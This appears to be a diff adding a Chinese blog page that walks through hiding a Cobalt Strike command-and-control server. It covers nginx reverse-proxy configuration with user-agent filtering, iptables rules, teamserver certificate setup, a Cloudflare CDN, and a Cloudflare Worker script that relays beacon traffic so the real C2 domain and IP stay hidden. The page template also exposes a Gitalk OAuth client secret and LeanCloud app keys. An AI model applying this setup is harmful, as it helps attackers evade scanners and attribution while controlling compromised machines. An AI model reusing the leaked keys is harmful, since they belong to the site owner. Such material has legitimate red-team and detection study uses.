@@ -1,0 +1,661 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Technology Blog">
+  <meta name="author" content="MYZXCG">
+  <meta name="keywords" content="Cyber Security">
+  <title>Cobalt Strike去特征：配置Nginx反向代理、CDN与Cloudflare Worker - MYZ&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"myzxcg.com","root":"/","version":"1.8.6","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"#"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":"G-RLPQJE3YTB","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI","app_key":"0GcKEskKSnNfqn5dbNITfO4H","server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MYZ's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                
+                Blog
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                
+                Links
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Cobalt Strike去特征：配置Nginx反向代理、CDN与Cloudflare Worker">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      MYZXCG
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-13 19:49" pubdate>
+        2020年12月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Cobalt Strike去特征：配置Nginx反向代理、CDN与Cloudflare Worker</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 个月前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间360公布了cobalt strike stage uri的特征，并且紧接着<a target="_blank" rel="noopener" href="https://github.com/qigpig/bypass-beacon-config-scan/">nmap扫描插件</a>也发布了。虽说这个特征很早就被发现了，但最近因为工作需要，所以才有空来折腾一下。</p>
+<p>关于隐藏cobalt strike的特征，网上有很多方法。例如nginx反代、域前置、修改源码等方法。本文主要从nginx反代、cloudflare cdn、cloudflare worker 这三个方面说一下如何隐藏cobalt strike  stage uri的特征，以及进一步隐藏c2域名和IP的方法。并记录一下部署过程中遇到的坑点。</p>
+<p>想了解域前置技术的小伙伴可以参考： <a target="_blank" rel="noopener" href="https://paper.seebug.org/1349/#_2">Cobalt Strike 绕过流量审计</a>。cloudflare无法使用域前置，因为它会校验SNI。目前不知到阿里云还行不行。本着匿名，加上cloudlfare免费、对国外访问支持比较好的特点，所以选择了cloudflare。</p>
+<h2 id="部署Nginx反向代理及https"><a href="#部署Nginx反向代理及https" class="headerlink" title="部署Nginx反向代理及https"></a>部署Nginx反向代理及https</h2><p>如果在cobalt strike的c2 malleable配置文件中没有自定义http-stager的uri。默认情况下，通过访问默认的uri，就能获取到cs的shellcode。加密shellcode的密钥又是固定的(3.x 0x69，4.x 0x2e)，所以能从shellcode中解出c2域名等配置信息。如图是nmap扫描插件的扫描结果。</p>
+<p><img src="images/image-20201213173117288.png" srcset="/img/loading.gif" alt=""></p>
+<p>这个特征解决方法有很多，比如：</p>
+<p>修改源码修改加密的密钥。（可参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a>）</p>
+<p>如果平常用的是stageless的shellcode（也就是200多k的shellcode），用不到stager的话，可以直接在malleable配置文件中set host_stage “false”，或着直接在cs中将stager，和stager64给关了。<br><img src="images/image-20201213172529346.png" srcset="/img/loading.gif" alt=""></p>
+<p>还有一种方法就是接下来介绍的：设置iptables，只允许localhost访问cs listener监听的端口。将外部请求通过nginx转发到localhost上的listener。还可以在nginx上设置过滤规则来允许特定请求。</p>
+<h3 id="配置-etc-nginx-nginx-conf文件。"><a href="#配置-etc-nginx-nginx-conf文件。" class="headerlink" title="配置/etc/nginx/nginx.conf文件。"></a>配置/etc/nginx/nginx.conf文件。</h3><p>这里你可以自己根据cs配置文件或者直接利用：<a target="_blank" rel="noopener" href="https://github.com/threatexpress/cs2modrewrite">通过cs malleable配置文件生成nginx.conf</a> 进行配置。cs的mallebale 配置文件我用的是<a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">jquery-c2.4.0.profile</a>。</p>
+<p>在nginx.conf中还可以添加对user-agent的校验，只有cs的shellcode才能访问到stage uri。</p>
+<div class="code-wrapper"><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">/</span>jquery<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.1</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">|</span><span class="token operator">/</span>jquery<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.2</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">|</span><span class="token operator">/</span>jquery<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.1</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">|</span><span class="token operator">/</span>jquery<span class="token operator">-</span><span class="token number">3.3</span><span class="token number">.2</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>$ <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$http_user_agent</span> <span class="token operator">!=</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token number">302</span> <span class="token variable">$REDIRECT_DOMAIN</span><span class="token variable">$request_uri</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">proxy_pass</span>          <span class="token variable">$C</span><span class="token number">2</span>_SERVER<span class="token punctuation">;</span>
+
+        <span class="token comment"># If you want to pass the C2 server's "Server" header through then uncomment this line</span>
+        <span class="token comment"># proxy_pass_header Server;</span>
+        <span class="token keyword">expires</span>             off<span class="token punctuation">;</span>
+        <span class="token keyword">proxy_redirect</span>      off<span class="token punctuation">;</span>
+        <span class="token keyword">proxy_set_header</span>    Host                <span class="token variable">$host</span><span class="token punctuation">;</span>
+        <span class="token keyword">proxy_set_header</span>    X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For     <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>
+        <span class="token keyword">proxy_set_header</span>    X<span class="token operator">-</span>Real<span class="token operator">-</span>IP           <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<h3 id="申请免费https证书"><a href="#申请免费https证书" class="headerlink" title="申请免费https证书"></a>申请免费https证书</h3><p>使用letsencrypt申请非常方便。使用官方推荐的工具<a target="_blank" rel="noopener" href="https://certbot.eff.org/lets-encrypt/debianstretch-nginx">Certbot - Debianstretch Nginx</a>，根据选择你自己的系统版本，根据教程几行命令搞定。</p>
+<p><strong>注意：</strong>提前在nginx.conf 配置文件中设置好<code>server name img.xxx.com</code>,。certbot会自动读取配置文件中的域名，并为它申请证书。生成的证书文件存储在：<code>/etc/letsencrypt/live/img.xxx.com/</code>目录下。</p>
+<p>在nginx配置文件中启用证书。</p>
+<div class="code-wrapper"><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment">#####################</span>
+<span class="token comment"># SSL Configuration</span>
+<span class="token comment">#####################</span>
+<span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>
+<span class="token keyword">listen</span> <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>
+<span class="token keyword">ssl</span> on<span class="token punctuation">;</span>
+<span class="token keyword">ssl_certificate</span> <span class="token operator">/</span>etc<span class="token operator">/</span>letsencrypt<span class="token operator">/</span>live<span class="token operator">/</span>img<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com<span class="token operator">/</span>fullchain<span class="token punctuation">.</span>pem<span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span>
+<span class="token keyword">ssl_certificate_key</span> <span class="token operator">/</span>etc<span class="token operator">/</span>letsencrypt<span class="token operator">/</span>live<span class="token operator">/</span>img<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com<span class="token operator">/</span>privkey<span class="token punctuation">.</span>pem<span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span>
+<span class="token keyword">ssl_session_cache</span> shared<span class="token punctuation">:</span>le_nginx_SSL<span class="token punctuation">:</span><span class="token number">1</span>m<span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span>
+<span class="token keyword">ssl_session_timeout</span> <span class="token number">1440</span>m<span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span>
+<span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token punctuation">.</span><span class="token number">1</span> TLSv1<span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span>
+<span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span> <span class="token comment"># managed by Certbot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<h4 id="为cobalt-strike-配置证书"><a href="#为cobalt-strike-配置证书" class="headerlink" title="为cobalt strike 配置证书"></a>为cobalt strike 配置证书</h4><ol>
+<li>生成img.xxx.com.store文件</li>
+</ol>
+<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 -export -in /etc/letsencrypt/live/img.xxx.com/fullchain.pem -inkey /etc/letsencrypt/live/jimg.xxx.com/privkey.pem -out img.xxx.com.p12 -name img.xxx.com -passout pass:123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+
+<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keytool -importkeystore -deststorepass <span class="token number">123456</span> -destkeypass <span class="token number">123456</span> -destkeystore img.xxx.com.store -srckeystore img.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass <span class="token number">123456</span> -alias img.xxx.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+
+<ol start="2">
+<li><p>将生成的img.xxx.com.store放到cs目录下，修改teamserver文件最后一行,将cobaltstrike.store修改为img.xxx.com.store和store文件对应的密码。</p>
+<p>（有必要的话，把端口号也可以改了并设置iptables只允许特定ip访问）</p>
+</li>
+</ol>
+<div class="code-wrapper"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -XX:ParallelGCThreads<span class="token operator">=</span><span class="token number">4</span> -Dcobaltstrike.server_port<span class="token operator">=</span><span class="token number">40120</span> -Djavax.net.ssl.keyStore<span class="token operator">=</span>./img.xxx.com.store -Djavax.net.ssl.keyStorePassword<span class="token operator">=</span><span class="token number">123456</span> -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer <span class="token variable">$*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div>
+
+<ol start="3">
+<li>将 keystore 加入 Malleable C2 profile 中</li>
+</ol>
+<div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">https-certificate &#123;
+     set keystore “img.xxx.com.store”;
+     set password “123456”;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p>然后启动cs设置listener。</p>
+<p>这里https port(bind):设置的8022（cs会把端口开在8022），在nginx配置文件中的将proxy_pass设置为：<a href="https://127.0.0.1:8022。">https://127.0.0.1:8022。</a></p>
+<p><img src="images/image-20201213182507733.png" srcset="/img/loading.gif" alt=""></p>
+<p>开启listener之后设置iptables，只允许127.0.0.1访问。这下nmap也就扫不出来了。</p>
+<div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -A INPUT -s <span class="token number">127.0</span>.0.1 -p tcp --dport <span class="token number">8022</span> -j ACCEPT
+iptables -A INPUT -p tcp --dport <span class="token number">8022</span> -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>
+
+<p>到此为止，隐藏cobalt strike特征的设置就暂时告一段落，下面继续说如何隐藏cs服务器ip和域名。</p>
+<h2 id="cobalt-stirke-配置cloudflare-cdn"><a href="#cobalt-stirke-配置cloudflare-cdn" class="headerlink" title="cobalt stirke 配置cloudflare cdn"></a>cobalt stirke 配置cloudflare cdn</h2><p>部署cdn是为了隐藏cs服务器的真实ip，以cloudflare的免费cdn为例，过程也非常简单。</p>
+<ol>
+<li>添加域名</li>
+</ol>
+<p><img src="images/2020-12-13-18.44.29.png" srcset="/img/loading.gif" alt=""></p>
+<ol start="2">
+<li>选择免费版本，设置要加速的子域名，并在你的域名服务商处修改域名解析dns为cloudflare的dns。</li>
+</ol>
+<p><img src="images/image-20201213184858683.png" srcset="/img/loading.gif" alt=""></p>
+<ol start="3">
+<li>经过cloudflare验证成功后，在进行多地ping，看一下生效没有。</li>
+</ol>
+<h3 id="cloudflare缓存"><a href="#cloudflare缓存" class="headerlink" title="cloudflare缓存"></a>cloudflare缓存</h3><p>cloudflare能开启开发模式，来禁用缓存，但是只有3个小时。可以通过页面规则来永久设置缓存规则。</p>
+<p><img src="images/image-20201213191246826.png" srcset="/img/loading.gif" alt="">因为cs配置文件中设置的uri都是js结尾的，所以这里使用*js来匹配所有uri。</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>配置完cdn后，会发现机器能上线，但是执行命令无回显。这个问题困扰了我好半天，一直以为是cloudlflare缓存配置问题，然而禁用缓存后问题依旧存在。最后逐步定位到是cs配置文件的问题。</p>
+<p>我用的是<a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">jquery-c2.4.0.profile</a>配置文件，它设置<code>header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</code>为响应头。修改所有响应头为：<code>header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</code>即可正常执行命令回显。</p>
+<p>这里的mime-type如果为application/javascript、text/html等，机器执行命令就无法回显。我怀疑是cdn会检测响应头content-type的值，如果是一些静态文件的mime-type可能就导致这个问题。</p>
+<p>至此，cdn就配置完了。并且能通过cdn正常上线。</p>
+<h2 id="配置cloudflare-worker"><a href="#配置cloudflare-worker" class="headerlink" title="配置cloudflare worker"></a>配置cloudflare worker</h2><p>如果能找到能进行域前置技术的cdn，推荐还是使用域前置。cloudfalre worker可以说只是一个替代品。</p>
+<p>cloudflare worker能够执行无服务器函数，免费用户有10万请求/每天的额度。并且你能自定义workers.dev的子域。我们可以编写js处理以及转发请求。</p>
+<p><img src="images/image-20201213192923764.png" srcset="/img/loading.gif" alt=""></p>
+<p>js脚本如下，需要设置<em>X</em>-<em>Forwarded</em>-For头，不然上线的ip是worker的ipv6地址。</p>
+<div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> upstream <span class="token operator">=</span> <span class="token string">'https://img.xxx.com'</span>
+
+<span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span><span class="token function">fetchAndApply</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fetchAndApply</span><span class="token punctuation">(</span><span class="token parameter">request</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> ipAddress <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'cf-connecting-ip'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> requestURL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> upstreamURL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>upstream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    requestURL<span class="token punctuation">.</span>protocol <span class="token operator">=</span> upstreamURL<span class="token punctuation">.</span>protocol<span class="token punctuation">;</span>
+    requestURL<span class="token punctuation">.</span>host <span class="token operator">=</span> upstreamURL<span class="token punctuation">.</span>host<span class="token punctuation">;</span>
+    requestURL<span class="token punctuation">.</span>pathname <span class="token operator">=</span> upstreamURL<span class="token punctuation">.</span>pathname <span class="token operator">+</span> requestURL<span class="token punctuation">.</span>pathname<span class="token punctuation">;</span>
+
+    <span class="token keyword">let</span> new_request_headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    new_request_headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">,</span> ipAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> fetchedResponse <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>
+        <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>requestURL<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            method<span class="token operator">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
+            headers<span class="token operator">:</span> new_request_headers<span class="token punctuation">,</span>
+            body<span class="token operator">:</span> request<span class="token punctuation">.</span>body
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> modifiedResponseHeaders <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span>fetchedResponse<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    modifiedResponseHeaders<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">'set-cookie'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span>
+        fetchedResponse<span class="token punctuation">.</span>body<span class="token punctuation">,</span>
+        <span class="token punctuation">&#123;</span>
+            headers<span class="token operator">:</span> modifiedResponseHeaders<span class="token punctuation">,</span>
+            status<span class="token operator">:</span> fetchedResponse<span class="token punctuation">.</span>status<span class="token punctuation">,</span>
+            statusText<span class="token operator">:</span> fetchedResponse<span class="token punctuation">.</span>statusText
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+
+<p><img src="images/2020-12-14-10-16.png" srcset="/img/loading.gif" alt=""></p>
+<p>点击保存部署，访问xxx.youtobe-mail.workers.dev域名，看看是否正常。然后在listener中设置</p>
+<p><img src="images/image-20201213194022291.png" srcset="/img/loading.gif" alt=""></p>
+<p>到此设置完毕。</p>
+<p>之后通信的请求都是通过xxx.xxx.workers.dev进行的，隐藏了真实域名。并且shellcode通信的ip地址也是cloudflare的ip。</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a>
+<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/232555.html">利用Cloudflare Worker来隐藏C2基础设施 - FreeBuf网络安全行业门户</a>
+<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/24765">关于Cobalt Strike检测方法与去特征的思考 - 安全内参 | 决策者的网络安全知识库</a>
+<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/6a724671de78">CS 合法证书 + Powershell 上线</a>
+<a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://github.com/threatexpress/cs2modrewrite">GitHub - threatexpress/cs2modrewrite: Convert Cobalt Strike profiles to modrewrite scripts</a>
+<a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">malleable-c2/jquery-c2.4.0.profile at master · threatexpress/malleable-c2 · GitHub</a>
+<a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Cobalt-Strike/">Cobalt Strike</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/20201215.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows https流量抓取与解密</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/20180928.html">
+                        <span class="hidden-mobile">Meterpreter+Proxychains实现端口转发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: 'e0d54f3fea956b581e05',
+          clientSecret: '1afd7215dc03a3fa856eb90ad3269d4e9b28a68e',
+          repo: 'myzxcg.github.io',
+          owner: 'myzxcg',
+          admin: ["myzxcg"],
+          id: '8dcad758d5aed77c3ce3c84059b00b9e',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
